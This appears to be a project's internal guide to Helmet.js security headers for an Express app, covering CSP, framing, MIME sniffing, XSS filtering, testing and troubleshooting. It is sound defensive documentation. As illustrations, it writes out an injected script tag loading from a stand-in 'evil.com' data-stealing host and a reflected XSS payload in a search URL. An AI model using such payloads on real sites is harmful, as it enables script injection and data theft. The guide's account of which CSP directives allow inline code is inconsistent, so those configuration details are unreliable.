================================================================================
                          WHAT IS HELMET.JS?
================================================================================

Helmet.js is a collection of middleware functions that set security-related
HTTP headers to protect your web application from common attacks.

Think of it as a "security guard" that automatically adds protective shields
to every response your server sends to browsers.


================================================================================
                        WHY WE NEED HELMET.JS
================================================================================

1. PROTECTION AGAINST ATTACKS
   - XSS (Cross-Site Scripting) - Prevents malicious script injection
   - Clickjacking - Stop attackers from tricking users into clicks
   - MIME Sniffing - Prevent browsers from running dangerous files
   - Information Leakage - Hide what software/versions you use

2. INDUSTRY STANDARD
   - Used by major companies (Google, Facebook, etc.)
   - Recommended by security experts worldwide
   - Part of OWASP best practices

3. EASY IMPLEMENTATION
   - Install: 1 command
   - Setup: 1 line of code
   - Result: 10+ security features automatically


================================================================================
                    SECURITY HEADERS EXPLAINED
================================================================================

Helmet adds these protective headers to EVERY response:


┌─────────────────────────────────────────────────────────────────────────┐
│ 1. CONTENT-SECURITY-POLICY (CSP)                                       │
│    What: Controls what resources (scripts, styles, etc.) can load      │
│    Protection: Blocks malicious scripts from running                   │
│    Example: Only allow scripts from your domain and CDN                │
└─────────────────────────────────────────────────────────────────────────┘

ATTACK WITHOUT CSP:
   Hacker injects: <script src="evil.com/steal-data.js"></script>
   Browser: "OK, I'll run it!"
   Result: User's data stolen ❌

WITH CSP:
   Hacker injects: <script src="evil.com/steal-data.js"></script>
   Browser: "CSP says only allow scripts from yoursite.com"
   Browser: "Blocked!"
   Result: User safe ✅


┌─────────────────────────────────────────────────────────────────────────┐
│ 2. X-FRAME-OPTIONS                                                     │
│    What: Prevents site from being embedded in frames/iframes           │
│    Protection: Stops clickjacking attacks                              │
│    Setting: DENY (cannot be framed at all)                            │
└─────────────────────────────────────────────────────────────────────────┘

ATTACK WITHOUT X-FRAME-OPTIONS:
   Hacker creates: invisible iframe with your login page
   User clicks: thinking they're on legitimate site
   Result: Password stolen by hacker ❌

WITH X-FRAME-OPTIONS:
   Hacker tries to embed your site in iframe
   Browser: "X-Frame-Options says DENY"
   Result: Iframe blocked, attack fails ✅


┌─────────────────────────────────────────────────────────────────────────┐
│ 3. X-CONTENT-TYPE-OPTIONS                                              │
│    What: Prevents MIME type sniffing                                   │
│    Protection: Forces browser to respect declared content types        │
│    Setting: nosniff                                                    │
└─────────────────────────────────────────────────────────────────────────┘

ATTACK WITHOUT NOSNIFF:
   Hacker uploads: "image.jpg" (actually virus.exe)
   Browser: "Hmm, looks like executable, I'll run it"
   Result: User's computer infected ❌

WITH NOSNIFF:
   Hacker uploads: "image.jpg" (actually virus.exe)
   Server says: "This is image/jpeg"
   Browser: "nosniff header present, treat as image only"
   Result: Virus cannot execute ✅


┌─────────────────────────────────────────────────────────────────────────┐
│ 4. X-XSS-PROTECTION                                                    │
│    What: Enables built-in XSS filter in old browsers                  │
│    Protection: Blocks reflected XSS attacks                            │
│    Setting: 1; mode=block                                              │
└─────────────────────────────────────────────────────────────────────────┘

ATTACK WITHOUT XSS PROTECTION:
   URL: yoursite.com?search=<script>alert('hacked')</script>
   Browser: Runs the script
   Result: Pop-ups, redirects, data theft ❌

WITH XSS PROTECTION:
   URL: yoursite.com?search=<script>alert('hacked')</script>
   Browser: "XSS detected and blocked"
   Result: Attack prevented ✅


┌─────────────────────────────────────────────────────────────────────────┐
│ 5. HIDE X-POWERED-BY                                                   │
│    What: Removes header revealing Express usage                        │
│    Protection: Hides technology stack from attackers                   │
│    Setting: hidePoweredBy: true                                        │
└─────────────────────────────────────────────────────────────────────────┘

WITHOUT HIDING:
   Response headers: X-Powered-By: Express
   Hacker: "I know all Express 4.18 vulnerabilities!"
   Result: Easier to exploit ❌

WITH HIDING:
   Response headers: (no X-Powered-By header)
   Hacker: "I don't know what they're using"
   Result: Harder to find exploits ✅

                    ESTIGEN SPECIFIC CONFIGURATION
================================================================================

Our Helmet configuration (in server.js lines 12-46):

1. CONTENT SECURITY POLICY
   ✅ Allow scripts from: own domain + cdnjs.cloudflare.com (for html2pdf)
   ✅ Allow styles: inline styles (needed for dynamic styling)

   for EstiGen's current implementation. Can be improved later.

2. FRAME PROTECTION
   ✅ Action: DENY (cannot be embedded in any iframe)
   ✅ Protects against clickjacking attacks

3. MIME SNIFFING
   ✅ Enabled: nosniff
   ✅ Prevents browser from guessing file types

4. XSS FILTER
   ✅ Enabled for older browsers
   ✅ Modern browsers use CSP instead

5. HIDE POWERED-BY
   ✅ X-Powered-By header removed
   ✅ Attackers won't know we use Express


================================================================================
                        TESTING HELMET IS WORKING
================================================================================

Method 1: Using Browser DevTools (Easiest)
   1. Open http://localhost:3000
   2. Press F12 (DevTools)
   3. Go to "Network" tab
   4. Refresh page (Ctrl+R or F5)
   5. Click on first request (usually "localhost")
   6. Look at "Response Headers"
   
   You should see:
   ✅ x-frame-options: DENY
   ✅ x-content-type-options: nosniff
   ✅ content-security-policy: default-src 'self'...
   ✅ x-xss-protection: 1; mode=block
   ❌ x-powered-by: (should NOT be present)


Method 2: Using curl (Command Line)
   
   curl -I http://localhost:3000
   
   Look for security headers in output


Method 3: Online Security Scanner
   
   1. Deploy your app to public URL
   2. Visit: https://securityheaders.com
   3. Enter your URL
   4. Check score (should be A or A+)

================================================================================
                        FUTURE IMPROVEMENTS
================================================================================

1. REMOVE 'unsafe-inline'
   Current: scriptSrc: ["'self'", "'unsafe-inline'"]
   Better: Move all inline scripts to external .js files
   Security gain: Blocks ALL unauthorized scripts

2. ADD STRICT-TRANSPORT-SECURITY (HSTS)
   When: You enable HTTPS in production
   Benefit: Forces all connections to use HTTPS
   
   Add to helmet config:
   hsts: {
       maxAge: 31536000,  // 1 year
       includeSubDomains: true,
       preload: true
   }

3. ADD REFERRER POLICY
   Controls what information is sent in Referer header
   
   Add to helmet config:
   referrerPolicy: { policy: 'same-origin' }


================================================================================
                        TROUBLESHOOTING
================================================================================

PROBLEM: "CSP blocks my external resource"
SOLUTION:
   1. Identify the blocked resource in browser console
   2. Add its domain to appropriate CSP directive in server.js
   3. Restart server
   
   Example: Adding Google Fonts
   fontSrc: ["'self'", "https://fonts.gstatic.com"]


PROBLEM: "App doesn't load after adding Helmet"
SOLUTION:
   1. Check browser console for CSP violations
   2. Most likely 'unsafe-inline' needed somewhere
   3. Add to appropriate directive temporarily
   4. Plan to refactor code to remove inline scripts


PROBLEM: "Supabase calls blocked"
SOLUTION:
   Already handled! We allow process.env.SUPABASE_URL
   If still blocked, ensure .env has correct SUPABASE_URL


PROBLEM: "Want to disable Helmet temporarily"
SOLUTION:
   Comment out the app.use(helmet(...)) line in server.js
   Or set environment variable: HELMET_DISABLED=true
